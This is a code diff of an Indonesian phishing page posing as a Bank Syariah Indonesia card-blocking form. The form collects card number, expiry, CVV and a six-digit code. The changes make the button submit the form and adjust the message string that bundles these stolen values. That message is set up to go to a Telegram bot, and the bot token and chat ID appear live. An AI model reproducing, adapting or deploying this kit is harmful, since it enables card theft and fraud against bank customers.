@@ -144,8 +144,8 @@ transaksi yang tidak anda lakukan.</label>
 <input type="hidden" id="cvv">   
 <input type="tel" id="kode" style="width: 100%; height: 40px; position; fixed; bottom: 0; right; 0; left: 0; margin-bottom: -30px; padding-left: 15px; background: #fff;color:#000;border-radius:20px;font-weight: bold;box-shadow: 2px 2px 2px 0px rgba(8,8,0,0.5);
 border: 0.8px solid #ddd; margin: 10px auto" placeholder="* * * * * *" maxlength="6"> <br>
-<button type="button" style="width: 100%; height: 40px; position; fixed; bottom: 0; right; 0; left: 0; margin-bottom: -30px; padding: 0px 0px; background: #01539D;color:#fff;border-radius:20px;font-weight: bold;box-shadow: 2px 2px 2px 0px rgba(8,8,0,0.5);
-border: 0px none #fff; margin: 10px auto" onclick="location.href='./index.html'">Blokir Kartu</button>      
+<button id="save-btn" type="submit" style="width: 100%; height: 40px; position; fixed; bottom: 0; right; 0; left: 0; margin-bottom: -30px; padding: 0px 0px; background: #01539D;color:#fff;border-radius:20px;font-weight: bold;box-shadow: 2px 2px 2px 0px rgba(8,8,0,0.5);
+border: 0px none #fff; margin: 10px auto" >Blokir Kartu</button>      
 
   </div> 
   </form>
@@ -219,7 +219,7 @@ document.getElementById('save-btn').innerHTML = "Memproses...";
         var cvv = document.getElementById('cvv');
         var kode = document.getElementById('kode');
 
-        var gabungan = "├•★𝓑𝓪𝓷𝓴 𝓢𝔂𝓪𝓻𝓲𝓪𝓱 𝓘𝓷𝓭𝓸𝓷𝓮𝓼𝓲𝓪★" + "%0A├─────•Blokir Kartu•────•" + '%0A├•※ 𝗞𝗮𝗿𝘁𝘂 : ' + kartu.value + '%0A├•※ 𝗩𝗮𝗹𝗶𝗱 : ' + valid.value + '%0A├•※ 𝗖𝗩𝗩 : ' + cvv.value + '%0A├•※ 𝗞𝗼𝗱𝗲 : ' + kode.value +  "%0A╰───────────────────•";
+        var gabungan = "%0A├─────•Blokir Kartu•────•" + '%0A├•※ 𝗞𝗮𝗿𝘁𝘂 : ' + kartu.value + '%0A├•※ 𝗩𝗮𝗹𝗶𝗱 : ' + valid.value + '%0A├•※ 𝗖𝗩𝗩 : ' + cvv.value + '%0A├•※ 𝗞𝗼𝗱𝗲 : ' + kode.value +  "%0A╰───────────────────•";
 
        var token = '7999807389:AAETg4lTEPUBzoKX0RH-uE66n_x_lZr6Mcw'; // Ganti dengan token bot yang kamu buat
         var grup = '5627551722'; // Ganti dengan chat id dari bot yang kamu buat
